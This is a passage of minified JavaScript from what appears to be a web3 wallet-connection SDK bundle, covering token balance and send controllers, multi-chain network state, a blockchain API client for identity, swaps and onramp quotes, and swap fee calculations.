this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:i,finished:n,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=n,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=i._cloneInto(e.iHash),e}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const iee=(r,e,t)=>new ree(r,e).update(t).digest();iee.create=(r,e)=>new ree(r,e);const iA={createBalance(r,e){const t={name:r.metadata.name||"",symbol:r.metadata.symbol||"",decimals:r.metadata.decimals||0,value:r.metadata.value||0,price:r.metadata.price||0,iconUrl:r.metadata.iconUrl||""};return{name:t.name,symbol:t.symbol,chainId:e,address:r.address==="native"?void 0:this.convertAddressToCAIP10Address(r.address,e),value:t.value,price:t.price,quantity:{decimals:t.decimals.toString(),numeric:this.convertHexToBalance({hex:r.balance,decimals:t.decimals})},iconUrl:t.iconUrl}},convertHexToBalance({hex:r,decimals:e}){return Vx(BigInt(r),e)},convertAddressToCAIP10Address(r,e){return`${e}:${r}`},createCAIP2ChainId(r,e){return`${e}:${parseInt(r,16)}`},getChainIdHexFromCAIP2ChainId(r){const e=r.split(":");if(e.length<2||!e[1])return"0x0";const t=e[1],i=parseInt(t,10);return isNaN(i)?"0x0":`0x${i.toString(16)}`},isWalletGetAssetsResponse(r){return typeof r!="object"||r===null?!1:Object.values(r).every(e=>Array.isArray(e)&&e.every(t=>this.isValidAsset(t)))},isValidAsset(r){return typeof r=="object"&&r!==null&&typeof r.address=="string"&&typeof r.balance=="string"&&(r.type==="ERC20"||r.type==="NATIVE")&&typeof r.metadata=="object"&&r.metadata!==null&&typeof r.metadata.name=="string"&&typeof r.metadata.symbol=="string"&&typeof r.metadata.decimals=="number"&&typeof r.metadata.price=="number"&&typeof r.metadata.iconUrl=="string"}},FF={async getMyTokensWithBalance(r){const e=Se.state.address,t=re.state.activeCaipNetwork;if(!e||!t)return[];if(t.chainNamespace==="eip155"){const n=await this.getEIP155Balances(e,t);if(n)return this.filterLowQualityTokens(n)}const i=await Lt.getBalance(e,t.caipNetworkId,r);return this.filterLowQualityTokens(i.balances)},async getEIP155Balances(r,e){try{const t=iA.getChainIdHexFromCAIP2ChainId(e.caipNetworkId);if(!(await ft.getCapabilities(r))?.[t]?.assetDiscovery?.supported)return null;const n=await ft.walletGetAssets({account:r,chainFilter:[t]});return iA.isWalletGetAssetsResponse(n)?(n[t]||[]).map(o=>iA.createBalance(o,e.caipNetworkId)):null}catch{return null}},filterLowQualityTokens(r){return r.filter(e=>e.quantity.decimals!=="0")},mapBalancesToSwapTokens(r){return r?.map(e=>({...e,address:e?.address?e.address:re.getActiveNetworkTokenAddress(),decimals:parseInt(e.quantity.decimals,10),logoUri:e.iconUrl,eip2612:!1}))||[]}},Xr=sr({tokenBalances:[],loading:!1}),Dr={state:Xr,subscribe(r){return ai(Xr,()=>r(Xr))},subscribeKey(r,e){return ci(Xr,r,e)},setToken(r){r&&(Xr.token=Ra(r))},setTokenAmount(r){Xr.sendTokenAmount=r},setReceiverAddress(r){Xr.receiverAddress=r},setReceiverProfileImageUrl(r){Xr.receiverProfileImageUrl=r},setReceiverProfileName(r){Xr.receiverProfileName=r},setGasPrice(r){Xr.gasPrice=r},setGasPriceInUsd(r){Xr.gasPriceInUSD=r},setNetworkBalanceInUsd(r){Xr.networkBalanceInUSD=r},setLoading(r){Xr.loading=r},sendToken(){switch(re.state.activeCaipNetwork?.chainNamespace){case"eip155":this.sendEvmToken();return;case"solana":this.sendSolanaToken();return;default:throw new Error("Unsupported chain")}},sendEvmToken(){this.state.token?.address&&this.state.sendTokenAmount&&this.state.receiverAddress?(Ve.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token.address,amount:this.state.sendTokenAmount,network:re.state.activeCaipNetwork?.caipNetworkId||""}}),this.sendERC20Token({receiverAddress:this.state.receiverAddress,tokenAddress:this.state.token.address,sendTokenAmount:this.state.sendTokenAmount,decimals:this.state.token.quantity.decimals})):this.state.receiverAddress&&this.state.sendTokenAmount&&this.state.gasPrice&&this.state.token?.quantity.decimals&&(Ve.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token?.symbol,amount:this.state.sendTokenAmount,network:re.state.activeCaipNetwork?.caipNetworkId||""}}),this.sendNativeToken({receiverAddress:this.state.receiverAddress,sendTokenAmount:this.state.sendTokenAmount,gasPrice:this.state.gasPrice,decimals:this.state.token.quantity.decimals}))},async fetchTokenBalance(r){Xr.loading=!0;const e=re.state.activeCaipNetwork?.caipNetworkId,t=re.state.activeCaipNetwork?.chainNamespace,i=re.state.activeCaipAddress,n=i?ke.getPlainAddress(i):void 0;if(Xr.lastRetry&&!ke.isAllowedRetry(Xr.lastRetry,30*kr.ONE_SEC_MS))return Xr.loading=!1,[];try{if(n&&e&&t){const s=await FF.getMyTokensWithBalance();return Xr.tokenBalances=s,Xr.lastRetry=void 0,s}}catch(s){Xr.lastRetry=Date.now(),r?.(s),vt.showError("Token Balance Unavailable")}finally{Xr.loading=!1}return[]},fetchNetworkBalance(){if(Xr.tokenBalances.length===0)return;const r=FF.mapBalancesToSwapTokens(Xr.tokenBalances);if(!r)return;const e=r.find(t=>t.address===re.getActiveNetworkTokenAddress());e&&(Xr.networkBalanceInUSD=e?Tr.multiply(e.quantity.numeric,e.price).toString():"0")},isInsufficientNetworkTokenForGas(r,e){const t=e||"0";return Tr.bigNumber(r).eq(0)?!0:Tr.bigNumber(Tr.bigNumber(t)).gt(r)},hasInsufficientGasFunds(){let r=!0;return Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT?r=!1:Xr.networkBalanceInUSD&&(r=this.isInsufficientNetworkTokenForGas(Xr.networkBalanceInUSD,Xr.gasPriceInUSD)),r},async sendNativeToken(r){Ee.pushTransactionStack({view:"Account",goBack:!1});const e=r.receiverAddress,t=Se.state.address,i=ft.parseUnits(r.sendTokenAmount.toString(),Number(r.decimals)),n="0x";try{await ft.sendTransaction({chainNamespace:"eip155",to:e,address:t,data:n,value:i??BigInt(0),gasPrice:r.gasPrice}),vt.showSuccess("Transaction started"),Ve.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token?.symbol||"",amount:r.sendTokenAmount,network:re.state.activeCaipNetwork?.caipNetworkId||""}}),this.resetSend()}catch(s){console.error("SendController:sendERC20Token - failed to send native token",s);const o=s instanceof Error?s.message:"Unknown error";Ve.sendEvent({type:"track",event:"SEND_ERROR",properties:{message:o,isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token?.symbol||"",amount:r.sendTokenAmount,network:re.state.activeCaipNetwork?.caipNetworkId||""}}),vt.showError("Something went wrong")}},async sendERC20Token(r){Ee.pushTransactionStack({view:"Account",goBack:!1});const e=ft.parseUnits(r.sendTokenAmount.toString(),Number(r.decimals));try{if(Se.state.address&&r.sendTokenAmount&&r.receiverAddress&&r.tokenAddress){const t=ke.getPlainAddress(r.tokenAddress);await ft.writeContract({fromAddress:Se.state.address,tokenAddress:t,args:[r.receiverAddress,e??BigInt(0)],method:"transfer",abi:E1e.getERC20Abi(t),chainNamespace:"eip155"}),vt.showSuccess("Transaction started"),this.resetSend()}}catch(t){console.error("SendController:sendERC20Token - failed to send erc20 token",t);const i=t instanceof Error?t.message:"Unknown error";Ve.sendEvent({type:"track",event:"SEND_ERROR",properties:{message:i,isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token?.symbol||"",amount:r.sendTokenAmount,network:re.state.activeCaipNetwork?.caipNetworkId||""}}),vt.showError("Something went wrong")}},sendSolanaToken(){if(!this.state.sendTokenAmount||!this.state.receiverAddress){vt.showError("Please enter a valid amount and receiver address");return}Ee.pushTransactionStack({view:"Account",goBack:!1}),ft.sendTransaction({chainNamespace:"solana",to:this.state.receiverAddress,value:this.state.sendTokenAmount}).then(()=>{this.resetSend(),Se.fetchTokenBalance()}).catch(r=>{vt.showError("Failed to send transaction. Please try again."),console.error("SendController:sendToken - failed to send solana transaction",r)})},resetSend(){Xr.token=void 0,Xr.sendTokenAmount=void 0,Xr.receiverAddress=void 0,Xr.receiverProfileImageUrl=void 0,Xr.receiverProfileName=void 0,Xr.loading=!1,Xr.tokenBalances=[]}},nA={currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[],user:void 0},sA={supportsAllNetworks:!0,smartAccountEnabledNetworks:[]},Et=sr({chains:_J(),activeCaipAddress:void 0,activeChain:void 0,activeCaipNetwork:void 0,noAdapters:!1,universalAdapter:{networkControllerClient:void 0,connectionControllerClient:void 0},isSwitchingNamespace:!1}),re={state:Et,subscribe(r){return ai(Et,()=>{r(Et)})},subscribeKey(r,e){return ci(Et,r,e)},subscribeChainProp(r,e,t){let i;return ai(Et.chains,()=>{const n=t||Et.activeChain;if(n){const s=Et.chains.get(n)?.[r];i!==s&&(i=s,e(s))}})},initialize(r,e,t){const{chainId:i,namespace:n}=He.getActiveNetworkProps(),s=e?.find(l=>l.id.toString()===i?.toString()),a=r.find(l=>l?.namespace===n)||r?.[0],c=new Set([...e?.map(l=>l.chainNamespace)??[]]);(r?.length===0||!a)&&(Et.noAdapters=!0),Et.noAdapters||(Et.activeChain=a?.namespace,Et.activeCaipNetwork=s,Et.activeChain&&t0.set({activeChain:a?.namespace})),c.forEach(l=>{const u=e?.filter(d=>d.chainNamespace===l);re.state.chains.set(l,{namespace:l,networkState:sr(sA),accountState:sr(nA),caipNetworks:u??[],...t}),this.setRequestedCaipNetworks(u??[],l)})},removeAdapter(r){if(Et.activeChain===r){const e=Array.from(Et.chains.entries()).find(([t])=>t!==r);if(e){const t=e[1]?.caipNetworks?.[0];t&&this.setActiveCaipNetwork(t)}}Et.chains.delete(r)},addAdapter(r,{networkControllerClient:e,connectionControllerClient:t},i){Et.chains.set(r.namespace,{namespace:r.namespace,networkState:sA,accountState:nA,caipNetworks:i,connectionControllerClient:t,networkControllerClient:e}),this.setRequestedCaipNetworks(i?.filter(n=>n.chainNamespace===r.namespace)??[],r.namespace)},addNetwork(r){const e=Et.chains.get(r.chainNamespace);if(e){const t=[...e.caipNetworks||[]];e.caipNetworks?.find(i=>i.id===r.id)||t.push(r),Et.chains.set(r.chainNamespace,{...e,caipNetworks:t}),this.setRequestedCaipNetworks(t,r.chainNamespace)}},removeNetwork(r,e){const t=Et.chains.get(r);if(t){const i=Et.activeCaipNetwork?.id===e,n=[...t.caipNetworks?.filter(s=>s.id!==e)||[]];i&&t?.caipNetworks?.[0]&&this.setActiveCaipNetwork(t.caipNetworks[0]),Et.chains.set(r,{...t,caipNetworks:n}),this.setRequestedCaipNetworks(n||[],r)}},setAdapterNetworkState(r,e){const t=Et.chains.get(r);t&&(t.networkState={...t.networkState||sA,...e},Et.chains.set(r,t))},setChainAccountData(r,e,t=!0){if(!r)throw new Error("Chain is required to update chain account data");const i=Et.chains.get(r);if(i){const n={...i.accountState||nA,...e};Et.chains.set(r,{...i,accountState:n}),(Et.chains.size===1||Et.activeChain===r)&&(e.caipAddress&&(Et.activeCaipAddress=e.caipAddress),Se.replaceState(n))}},setAccountProp(r,e,t,i=!0){this.setChainAccountData(t,{[r]:e},i)},setActiveNamespace(r){Et.activeChain=r;const e=r?Et.chains.get(r):void 0,t=e?.networkState?.caipNetwork;t?.id&&r&&(Et.activeCaipAddress=e?.accountState?.caipAddress,Et.activeCaipNetwork=t,He.setActiveCaipNetworkId(t?.caipNetworkId),t0.set({activeChain:r,selectedNetworkId:t?.caipNetworkId}))},setActiveCaipNetwork(r){if(!r)return;Et.activeChain!==r.chainNamespace&&(this.setIsSwitchingNamespace(!0),Xe.setFilterByNamespace(r.chainNamespace));const e=Et.chains.get(r.chainNamespace);Et.activeChain=r.chainNamespace,Et.activeCaipNetwork=r,e?.accountState?.address?Et.activeCaipAddress=`${r.chainNamespace}:${r.id}:${e?.accountState?.address}`:Et.activeCaipAddress=void 0,this.setAccountProp("caipAddress",Et.activeCaipAddress,r.chainNamespace),e&&Se.replaceState(e.accountState),Dr.resetSend(),t0.set({activeChain:Et.activeChain,selectedNetworkId:Et.activeCaipNetwork?.caipNetworkId}),He.setActiveCaipNetworkId(r.caipNetworkId),!this.checkIfSupportedNetwork(r.chainNamespace)&&!Ne.state.allowUnsupportedChain&&this.showUnsupportedChainUI()},addCaipNetwork(r){if(!r)return;const e=Et.chains.get(r.chainNamespace);e&&e?.caipNetworks?.push(r)},async switchActiveNetwork(r){!re.state.chains.get(re.state.activeChain)?.caipNetworks?.some(n=>n.id===Et.activeCaipNetwork?.id)&&Ee.goBack();const i=this.getNetworkControllerClient(r.chainNamespace);i&&(await i.switchCaipNetwork(r),Ve.sendEvent({type:"track",event:"SWITCH_NETWORK",properties:{network:r.caipNetworkId}}))},getNetworkControllerClient(r){const e=r||Et.activeChain,t=Et.chains.get(e);if(!t)throw new Error("Chain adapter not found");if(!t.networkControllerClient)throw new Error("NetworkController client not set");return t.networkControllerClient},getConnectionControllerClient(r){const e=r||Et.activeChain;if(!e)throw new Error("Chain is required to get connection controller client");const t=Et.chains.get(e);if(!t?.connectionControllerClient)throw new Error("ConnectionController client not set");return t.connectionControllerClient},getAccountProp(r,e){let t=Et.activeChain;if(e&&(t=e),!t)return;const i=Et.chains.get(t)?.accountState;if(i)return i[r]},getNetworkProp(r,e){const t=Et.chains.get(e)?.networkState;if(t)return t[r]},getRequestedCaipNetworks(r){const e=Et.chains.get(r),{approvedCaipNetworkIds:t=[],requestedCaipNetworks:i=[]}=e?.networkState||{};return ke.sortRequestedNetworks(t,i)},getAllRequestedCaipNetworks(){const r=[];return Et.chains.forEach(e=>{const t=this.getRequestedCaipNetworks(e.namespace);r.push(...t)}),r},setRequestedCaipNetworks(r,e){this.setAdapterNetworkState(e,{requestedCaipNetworks:r})},getAllApprovedCaipNetworkIds(){const r=[];return Et.chains.forEach(e=>{const t=this.getApprovedCaipNetworkIds(e.namespace);r.push(...t)}),r},getActiveCaipNetwork(){return Et.activeCaipNetwork},getActiveCaipAddress(){return Et.activeCaipAddress},getApprovedCaipNetworkIds(r){return Et.chains.get(r)?.networkState?.approvedCaipNetworkIds||[]},async setApprovedCaipNetworksData(r){const t=await this.getNetworkControllerClient()?.getApprovedCaipNetworksData();this.setAdapterNetworkState(r,{approvedCaipNetworkIds:t?.approvedCaipNetworkIds,supportsAllNetworks:t?.supportsAllNetworks})},checkIfSupportedNetwork(r){const e=Et.activeCaipNetwork,t=this.getRequestedCaipNetworks(r);return t.length?t?.some(i=>i.id===e?.id):!0},checkIfSupportedChainId(r){return Et.activeChain?this.getRequestedCaipNetworks(Et.activeChain)?.some(t=>t.id===r):!0},setSmartAccountEnabledNetworks(r,e){this.setAdapterNetworkState(e,{smartAccountEnabledNetworks:r})},checkIfSmartAccountEnabled(){const r=SJ.caipNetworkIdToNumber(Et.activeCaipNetwork?.caipNetworkId),e=Et.activeChain;return!e||!r?!1:!!this.getNetworkProp("smartAccountEnabledNetworks",e)?.includes(Number(r))},getActiveNetworkTokenAddress(){const r=Et.activeCaipNetwork?.chainNamespace||"eip155",e=Et.activeCaipNetwork?.id||1,t=kr.NATIVE_TOKEN_ADDRESS[r];return`${r}:${e}:${t}`},showUnsupportedChainUI(){Ut.open({view:"UnsupportedChain"})},checkIfNamesSupported(){const r=Et.activeCaipNetwork;return!!(r?.chainNamespace&&kr.NAMES_SUPPORTED_CHAIN_NAMESPACES.includes(r.chainNamespace))},resetNetwork(r){this.setAdapterNetworkState(r,{approvedCaipNetworkIds:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]})},resetAccount(r){const e=r;if(!e)throw new Error("Chain is required to set account prop");Et.activeCaipAddress=void 0,this.setChainAccountData(e,{smartAccountDeployed:!1,currentTab:0,caipAddress:void 0,address:void 0,balance:void 0,balanceSymbol:void 0,profileName:void 0,profileImage:void 0,addressExplorerUrl:void 0,tokenBalance:[],connectedWalletInfo:void 0,preferredAccountType:void 0,socialProvider:void 0,socialWindow:void 0,farcasterUrl:void 0,allAccounts:[],user:void 0})},async disconnect(){try{Dr.resetSend();const r=await Promise.allSettled(Array.from(Et.chains.entries()).map(async([t,i])=>{try{i.connectionControllerClient?.disconnect&&await i.connectionControllerClient.disconnect(),this.resetAccount(t),this.resetNetwork(t),He.deleteConnectedConnectorId(t)}catch(n){throw new Error(`Failed to disconnect chain ${t}: ${n.message}`)}}));ft.resetWcConnection();const e=r.filter(t=>t.status==="rejected");if(e.length>0)throw new Error(e.map(t=>t.reason.message).join(", "));He.deleteConnectedSocialProvider(),ft.resetWcConnection(),Ve.sendEvent({type:"track",event:"DISCONNECT_SUCCESS"})}catch(r){console.error(r.message||"Failed to disconnect chains"),Ve.sendEvent({type:"track",event:"DISCONNECT_ERROR",properties:{message:r.message||"Failed to disconnect chains"}})}},setIsSwitchingNamespace(r){Et.isSwitchingNamespace=r},getFirstCaipNetworkSupportsAuthConnector(){const r=[];let e;if(Et.chains.forEach(t=>{Me.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(i=>i===t.namespace)&&t.namespace&&r.push(t.namespace)}),r.length>0){const t=r[0];return e=t?Et.chains.get(t)?.caipNetworks?.[0]:void 0,e}},getAccountDataByChainNamespace(r){return r?re.state.chains.get(r)?.accountState:re.state.activeChain?re.state.chains.get(re.state.activeChain)?.accountState:void 0}},Pke={purchaseCurrencies:[{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"Ether",symbol:"ETH",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]}],paymentCurrencies:[{id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},{id:"EUR",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]}]},nee=ke.getBlockchainApiUrl(),Ka=sr({clientId:null,api:new Xx({baseUrl:nee,clientId:null}),supportedChains:{http:[],ws:[]}}),Lt={state:Ka,async get(r){const{st:e,sv:t}=Lt.getSdkProperties(),i=Ne.state.projectId,n={...r.params||{},st:e,sv:t,projectId:i};return Ka.api.get({...r,params:n})},getSdkProperties(){const{sdkType:r,sdkVersion:e}=Ne.state;return{st:r||"unknown",sv:e||"unknown"}},async isNetworkSupported(r){if(!r)return!1;try{Ka.supportedChains.http.length||await Lt.getSupportedNetworks()}catch{return!1}return Ka.supportedChains.http.includes(r)},async getSupportedNetworks(){const r=await Lt.get({path:"v1/supported-chains"});return Ka.supportedChains=r,r},async fetchIdentity({address:r,caipNetworkId:e}){if(!await Lt.isNetworkSupported(e))return{avatar:"",name:""};const i=He.getIdentityFromCacheForAddress(r);if(i)return i;const n=await Lt.get({path:`/v1/identity/${r}`,params:{sender:re.state.activeCaipAddress?ke.getPlainAddress(re.state.activeCaipAddress):void 0}});return He.updateIdentityCache({address:r,identity:n,timestamp:Date.now()}),n},async fetchTransactions({account:r,cursor:e,onramp:t,signal:i,cache:n,chainId:s}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:`/v1/account/${r}/history`,params:{cursor:e,onramp:t,chainId:s},signal:i,cache:n}):{data:[],next:void 0}},async fetchSwapQuote({amount:r,userAddress:e,from:t,to:i,gasPrice:n}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:"/v1/convert/quotes",headers:{"Content-Type":"application/json"},params:{amount:r,userAddress:e,from:t,to:i,gasPrice:n}}):{quotes:[]}},async fetchSwapTokens({chainId:r}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:"/v1/convert/tokens",params:{chainId:r}}):{tokens:[]}},async fetchTokenPrice({addresses:r}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Ka.api.post({path:"/v1/fungible/price",body:{currency:"usd",addresses:r,projectId:Ne.state.projectId},headers:{"Content-Type":"application/json"}}):{fungibles:[]}},async fetchSwapAllowance({tokenAddress:r,userAddress:e}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:"/v1/convert/allowance",params:{tokenAddress:r,userAddress:e},headers:{"Content-Type":"application/json"}}):{allowance:"0"}},async fetchGasPrice({chainId:r}){const{st:e,sv:t}=Lt.getSdkProperties();if(!await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Gas Price");return Lt.get({path:"/v1/convert/gas-price",headers:{"Content-Type":"application/json"},params:{chainId:r,st:e,sv:t}})},async generateSwapCalldata({amount:r,from:e,to:t,userAddress:i}){if(!await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Swaps");return Ka.api.post({path:"/v1/convert/build-transaction",headers:{"Content-Type":"application/json"},body:{amount:r,eip155:{slippage:kr.CONVERT_SLIPPAGE_TOLERANCE},projectId:Ne.state.projectId,from:e,to:t,userAddress:i}})},async generateApproveCalldata({from:r,to:e,userAddress:t}){const{st:i,sv:n}=Lt.getSdkProperties();if(!await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Swaps");return Lt.get({path:"/v1/convert/build-approve",headers:{"Content-Type":"application/json"},params:{userAddress:t,from:r,to:e,st:i,sv:n}})},async getBalance(r,e,t){const{st:i,sv:n}=Lt.getSdkProperties();if(!await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId))return{balances:[]};const o=`${e}:${r}`,a=He.getBalanceCacheForCaipAddress(o);if(a)return a;const c=await Lt.get({path:`/v1/account/${r}/balance`,params:{currency:"usd",chainId:e,forceUpdate:t,st:i,sv:n}});return He.updateBalanceCache({caipAddress:o,balance:c,timestamp:Date.now()}),c},async lookupEnsName(r){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:`/v1/profile/account/${r}`,params:{apiVersion:"2"}}):{addresses:{},attributes:[]}},async reverseLookupEnsName({address:r}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:`/v1/profile/reverse/${r}`,params:{sender:Se.state.address,apiVersion:"2"}}):[]},async getEnsNameSuggestions(r){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:`/v1/profile/suggestions/${r}`,params:{zone:"reown.id"}}):{suggestions:[]}},async registerEnsName({coinType:r,address:e,message:t,signature:i}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Ka.api.post({path:"/v1/profile/account",body:{coin_type:r,address:e,message:t,signature:i},headers:{"Content-Type":"application/json"}}):{success:!1}},async generateOnRampURL({destinationWallets:r,partnerUserId:e,defaultNetwork:t,purchaseAmount:i,paymentAmount:n}){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?(await Ka.api.post({path:"/v1/generators/onrampurl",params:{projectId:Ne.state.projectId},body:{destinationWallets:r,defaultNetwork:t,partnerUserId:e,defaultExperience:"buy",presetCryptoAmount:i,presetFiatAmount:n}})).url:""},async getOnrampOptions(){if(!await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId))return{paymentCurrencies:[],purchaseCurrencies:[]};try{return await Lt.get({path:"/v1/onramp/options"})}catch{return Pke}},async getOnrampQuote({purchaseCurrency:r,paymentCurrency:e,amount:t,network:i}){try{return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?await Ka.api.post({path:"/v1/onramp/quote",params:{projectId:Ne.state.projectId},body:{purchaseCurrency:r,paymentCurrency:e,amount:t,network:i}}):null}catch{return{coinbaseFee:{amount:t,currency:e.id},networkFee:{amount:t,currency:e.id},paymentSubtotal:{amount:t,currency:e.id},paymentTotal:{amount:t,currency:e.id},purchaseAmount:{amount:t,currency:e.id},quoteId:"mocked-quote-id"}}},async getSmartSessions(r){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Lt.get({path:`/v1/sessions/${r}`}):[]},async revokeSmartSession(r,e,t){return await Lt.isNetworkSupported(re.state.activeCaipNetwork?.caipNetworkId)?Ka.api.post({path:`/v1/sessions/${r}/revoke`,params:{projectId:Ne.state.projectId},body:{pci:e,signature:t}}):{success:!1}},setClientId(r){Ka.clientId=r,Ka.api=new Xx({baseUrl:nee,clientId:r})}},s5={async getTokenList(){const r=re.state.activeCaipNetwork;return(await Lt.fetchSwapTokens({chainId:r?.caipNetworkId}))?.tokens?.map(i=>({...i,eip2612:!1,quantity:{decimals:"0",numeric:"0"},price:0,value:0}))||[]},async fetchGasPrice(){const r=re.state.activeCaipNetwork;if(!r)return null;try{switch(r.chainNamespace){case"solana":const e=(await ft?.estimateGas({chainNamespace:"solana"}))?.toString();return{standard:e,fast:e,instant:e};case"eip155":default:return await Lt.fetchGasPrice({chainId:r.caipNetworkId})}}catch{return null}},async fetchSwapAllowance({tokenAddress:r,userAddress:e,sourceTokenAmount:t,sourceTokenDecimals:i}){const n=await Lt.fetchSwapAllowance({tokenAddress:r,userAddress:e});if(n?.allowance&&t&&i){const s=ft.parseUnits(t,i)||0;return BigInt(n.allowance)>=s}return!1},async getMyTokensWithBalance(r){const e=Se.state.address,t=re.state.activeCaipNetwork;if(!e||!t)return[];const n=(await Lt.getBalance(e,t.caipNetworkId,r)).balances.filter(s=>s.quantity.decimals!=="0");return Se.setTokenBalance(n,re.state.activeChain),this.mapBalancesToSwapTokens(n)},mapBalancesToSwapTokens(r){return r?.map(e=>({...e,address:e?.address?e.address:re.getActiveNetworkTokenAddress(),decimals:parseInt(e.quantity.decimals,10),logoUri:e.iconUrl,eip2612:!1}))||[]}},Ph={getGasPriceInEther(r,e){const t=e*r;return Number(t)/1e18},getGasPriceInUSD(r,e,t){const i=Ph.getGasPriceInEther(e,t);return Tr.bigNumber(r).times(i).toNumber()},getPriceImpact({sourceTokenAmount:r,sourceTokenPriceInUSD:e,toTokenPriceInUSD:t,toTokenAmount:i}){const n=Tr.bigNumber(r).times(e),s=Tr.bigNumber(i).times(t);return n.minus(s).div(n).times(100).toNumber()},getMaxSlippage(r,e){const t=Tr.bigNumber(r).div(100);return Tr.multiply(e,t).toNumber()},getProviderFee(r,e=.0085){return Tr.bigNumber(r).times(e).toString()},isInsufficientNetworkTokenForGas(r,e){const t=e||"0";return Tr.bigNumber(r).eq(0)?!0:Tr.bigNumber(Tr.bigNumber(t)).gt(r)},isInsufficientSourceTokenForSwap(r,e,t){const i=t?.find(s=>s.address===e)?.quantity?.numeric;return Tr.bigNumber(i||"0").lt(r)},getToTokenAmount({sourceToken:r,toToken:e,sourceTokenPrice:t,toTokenPrice:i,sourceTokenAmount:n}){if(n==="0"||!r||!e)return"0";const s=r.decimals,o=t,a=e.decimals,c=i;if(c<=0)return"0";const l=Tr.bigNumber(n).times(.0085),d=Tr.bigNumber(n).minus(l).times(Tr.bigNumber(10).pow(s)),h=Tr.bigNumber(o).div(c),f=s-a;return d.times(h).div(Tr.bigNumber(10).pow(f)).div(Tr.bigNumber(10).pow(a)).toFixed(a).toString()}},qF=15e4,$ke=6,pa={initializing:!1,initialized:!1,loadingPrices:!1,loadingQuote:!1,loadingApprovalTransaction:!1,loadingBuildTransaction:!1,loadingTransaction:!1,fetchError:!1,approvalTransaction:void 0,swapTransaction:void 0,transactionError:void 0,sourceToken:void 0,sourceTokenAmount:"",sourceTokenPriceInUSD:0,toToken:void 0,toTokenAmount:"",toTokenPriceInUSD:0,networkPrice:"0",networkBalanceInUSD:"0",networkTokenSymbol:"",inputError:void 0,slippage:kr.CONVERT_SLIPPAGE_TOLERANCE,tokens:void 0,popularTokens:void 0,suggestedTokens:void 0,foundTokens:void 0,myTokensWithBalance:void 0,tokensPriceMap:{},gasFee:"0",gasPriceInUSD:0,priceImpact:void 0,maxSlippage:void 0,providerFee:void 0},Ie=sr(pa),dt={state:Ie,subscribe(r){return ai(Ie,()=>r(Ie))},subscribeKey(r,e){return ci(Ie,r,e)},getParams(){const r=re.state.activeCaipAddress,e=re.state.activeChain,t=ke.getPlainAddress(r),i=re.getActiveNetworkTokenAddress(),n=He.getConnectedConnectorId(e);if(!t)throw new Error("No address found to swap the tokens from.");const 